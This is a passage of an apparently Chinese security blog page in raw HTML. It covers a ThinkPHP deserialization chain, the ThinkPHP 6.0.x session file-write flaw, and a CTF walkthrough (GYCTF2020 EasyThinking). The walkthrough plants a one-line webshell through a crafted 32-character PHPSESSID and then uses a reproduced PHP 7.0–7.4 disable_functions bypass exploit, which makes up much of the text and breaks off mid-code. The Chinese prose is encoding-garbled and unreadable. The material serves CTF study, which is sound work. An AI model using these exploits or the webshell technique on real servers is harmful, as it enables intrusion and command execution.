class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0st-9/images/main/image/1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">)</p><h1 id="ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"><a href="#ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ" class="headerlink" title="ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"></a>ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</h1><h2 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>phpstudy+thinkphp(&lt;&#x3D;6.0.0ç‰ˆæœ¬&lt;&#x3D;6.0.2) + php7ä»¥ä¸Š</strong></p><p>thinkphp6åªèƒ½åˆ©ç”¨composerä¸‹è½½ï¼Œå‚è€ƒ<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">æ–‡ç« </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=<span class="number">6.0</span>.<span class="number">0</span> tp6.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c5e2cc1ae0fd473ca97982f102884e00.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹è½½å®Œæˆåè®¿é—®**localhost&#x2F;tp6.0&#x2F;public&#x2F;**ç”Ÿæ•ˆ</p><p>è‡³æ­¤ç¯å¢ƒæ­å»ºå®Œæ¯•</p><h2 id="æ¼æ´å‰–æ"><a href="#æ¼æ´å‰–æ" class="headerlink" title="æ¼æ´å‰–æ"></a>æ¼æ´å‰–æ</h2><p><strong>é¦–å…ˆçœ‹çœ‹å®˜æ–¹ä¿¡æ¯</strong></p><p><img src="https://img-blog.csdnimg.cn/9d4de9bfdf034c5ea249d2036b47e81f.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥çœ‹åˆ°å®˜æ–¹å¯¹<strong>src&#x2F;think&#x2F;session&#x2F;Store.php</strong>ä¸­åœ¨<strong>id</strong>è®¾ç½®æ—¶å¤šå¢åŠ äº†ä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤çŒœæµ‹å¯èƒ½æ˜¯åœ¨å­˜å‚¨<strong>Session</strong>æ—¶å¯¼è‡´äº†æ–‡ä»¶å†™å…¥</p><p>æ‰€ä»¥æˆ‘ä»¬æ¥åˆ°<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php</strong>ï¼Œå¯¹<strong>save()<strong>æ–¹æ³•ä¸­çš„</strong>write</strong>å‡½æ•°è¿›è¡Œè·Ÿè¸ª</p><p><img src="https://img-blog.csdnimg.cn/924c83fdacbc41299a34847e9ca58e1a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong></p><p><img src="https://img-blog.csdnimg.cn/cb8762317b604f2cad0ed0e8557a6d5d.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆè°ƒç”¨äº†<strong>writeFile</strong>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong></p><p><img src="https://img-blog.csdnimg.cn/03337613909c45b1af80ad7f6eabfc44.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°<strong>file_put_contents</strong>å‡½æ•°ï¼Œæœç„¶æ˜¯èƒ½å†™å…¥æ–‡ä»¶çš„æ“ä½œ</p><p>åå‘åˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$content</span>,LOCK_EX)ä¸­çš„å‚æ•°<span class="variable">$path</span>,<span class="variable">$content</span>æ¥æºäº<span class="title function_ invoke__">writeFile</span>(<span class="variable">$path</span>,<span class="variable">$data</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">writeFile</span>(<span class="variable">$path</span>,<span class="variable">$data</span>)ä¸­çš„å‚æ•°<span class="variable">$path</span>,<span class="variable">$data</span>æ¥æºäº<span class="title function_ invoke__">write</span>(String <span class="variable">$sessID</span>,String <span class="variable">$sessData</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">write</span>(String <span class="variable">$sessID</span>,String <span class="variable">$sessData</span>)ä¸­çš„å‚æ•°<span class="variable">$sessID</span>,<span class="variable">$sessData</span>æ¥æºäº<span class="title function_ invoke__">save</span>()ä¸­è°ƒç”¨äº†<span class="title function_ invoke__">write</span>()</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€ç»ˆæ¨å¯¼å‡ºæ–‡ä»¶åå°±æ˜¯æ¥è‡ªäº<strong>getId()<strong>å¾—åˆ°çš„</strong>$sessionId</strong>çš„å€¼</p><p><img src="https://img-blog.csdnimg.cn/09b30c1622f54c8e871db7785a1352b5.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»“åˆ<strong>setId</strong>å’Œ<strong>getId</strong>ï¼Œå‘ç°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“ä¼ å…¥çš„idå€¼é•¿åº¦ä¸º32æ—¶ï¼Œåˆ›å»ºsessionIdï¼Œç„¶åè¿›è¡ŒgitId()</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±åº”å¯»æ‰¾è°ƒç”¨<strong>setID</strong>çš„åœ°æ–¹ï¼Œå‘ç°åœ¨<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</strong></p><p><img src="https://img-blog.csdnimg.cn/4bcc5b283d744104bc0bf3a283135d0b.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯¹è¿™é‡Œçš„<strong>getName</strong>è¿›è¡Œè¿½è¸ªå‘ç°ï¼Œ**$cookieName**&#x3D;<strong>PHPSESSID</strong></p><p><img src="https://img-blog.csdnimg.cn/232af69eba7c4ac497f476c9bbd72041.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è€Œ**$sessionId**<code>æ˜¯</code><strong>cookie</strong>ä¸­åä¸º<strong>PHPSESSID</strong>çš„å€¼ï¼Œå› ä¸º<strong>sessionId</strong>æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œä»è€Œå¯¼è‡´å†™å…¥çš„æ–‡ä»¶åå¯æ§</p><p>è€Œå†™å…¥çš„å†…å®¹æ˜¯åˆ›å»º<strong>session</strong>ä½¿ç”¨çš„å†…å®¹ã€‚ä½†æ˜¯<strong>session</strong>çš„å†…å®¹æ˜¯ç”±å®é™…çš„åç«¯ä¸šåŠ¡é€»è¾‘æ¥å†³å®šçš„ï¼Œå†µä¸”é»˜è®¤ç¯å¢ƒä¸‹å¹¶æ²¡æœ‰åˆ›å»º<strong>session</strong>ã€‚å› æ­¤ï¼Œé»˜è®¤ç¯å¢ƒä¸‹æ— æ³•åšåˆ°ä»»æ„æ–‡ä»¶å†™å…¥ã€‚æƒ³è¦åšåˆ°ä»»æ„æ–‡ä»¶å†™å…¥çš„æ¡ä»¶æ˜¯éå¸¸è‹›åˆ»çš„</p><p>å¦‚æœè¦getshellçš„è¯ï¼Œåç«¯éœ€è¦æœ‰ç±»ä¼¼çš„<code>Session::Set(&#39;name&#39;,$_POST[&#39;abc&#39;])</code>ä»£ç æ‰å¯ä»¥å®ç°</p><p>åŒæ—¶ï¼Œåœ¨è¿›è¡Œæ·±å…¥åˆ†æåï¼Œå‘ç°è¿˜å¯ä»¥å®ç°<strong>ä»»æ„æ–‡ä»¶åˆ é™¤</strong>ï¼Œä¸”æ–‡ä»¶åˆ é™¤å¯¹åç«¯ä¸šåŠ¡é€»è¾‘ä¾èµ–è¾ƒä½ã€‚</p><h2 id="ä¾‹é¢˜å®æ“-1"><a href="#ä¾‹é¢˜å®æ“-1" class="headerlink" title="ä¾‹é¢˜å®æ“"></a>ä¾‹é¢˜å®æ“</h2><h3 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h3><p>è¿™é‡Œé€šè¿‡<strong>dirsearch</strong>è¿›è¡Œç›®å½•æ‰«æèƒ½è·å–åˆ°<strong><a href="http://www.zip/">www.zip</a></strong>ä¸‹è½½å³å¯è·å¾—æºç ï¼Œè¿™é‡Œå°±ä¸åˆ†æäº†ï¼Œå°±æ˜¯åˆ©ç”¨ä¸Šé¢çš„æ¼æ´å˜åŒ–å‡ºæ¥çš„</p><p>å¯åŠ¨é¢˜ç›®ï¼Œåœ¨æ³¨å†Œè´¦å·ç™»é™†æ—¶ï¼Œç”¨bpæˆªåŒ…ï¼Œå°†sessioné•¿åº¦æ”¹ä¸º32ä½çš„phpæ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/5b43cf46dcc3437fb89baed6c266e4fb.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹‹åç™»å½•ï¼Œè¿›å…¥æœç´¢ç•Œé¢ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://img-blog.csdnimg.cn/d6628d9b9af64342b0a1fc86a5056c5e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç‚¹å‡»æœç´¢åï¼Œä¾¿æˆåŠŸå†™å…¥ï¼Œ</p><p><strong>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹</strong>ï¼Œå› ä¸ºå‘ç°ç½‘ä¸Šå…³äºä¸ºä»€ä¹ˆåœ¨æœç´¢æ¡†å¤„å†™å…¥æœ¨é©¬éƒ½æ²¡æœ‰ä»‹ç»</p><p>ä¸‹è½½æºç åï¼Œå‘ç°</p><p><strong>app\home\controller\Member.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Request</span>::<span class="title function_ invoke__">isPost</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">session</span>(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">            <span class="variable">$record</span> = <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$recordArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">                <span class="variable">$recordLen</span> = <span class="title function_ invoke__">sizeof</span>(<span class="variable">$recordArr</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">array_shift</span>(<span class="variable">$recordArr</span>);</span><br><span class="line">                    <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                    <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">View</span>(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<strong>searchå‡½æ•°ä¼šæŠŠæœç´¢æ¡†POSTæ•°æ®å­˜åˆ°sessionæ–‡ä»¶é‡Œé¢</strong></p><p>æ–‡ä»¶è·¯å¾„æ˜¯<br><code>runtime/session/sess_123456789123456789123456789a.php</code></p><p>ç”¨èšå‰‘è¿æ¥</p><p>åœ¨æ ¹ç›®å½•ä¸‹å‘ç°<strong>flag</strong></p><p><img src="https://img-blog.csdnimg.cn/b7ba6cc0a46e4c05a9fcf022d65ef6a6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯è¿˜éœ€æ‰§è¡Œ<strong>readflag</strong>æ‰èƒ½è·å–</p><p>è¿™é‡Œç›´æ¥ä¸Š<strong>github</strong>ä¸Šçš„è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//å°†è¿™é‡Œçš„å‘½ä»¤æ”¹æˆ/readflagå³å¯</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = 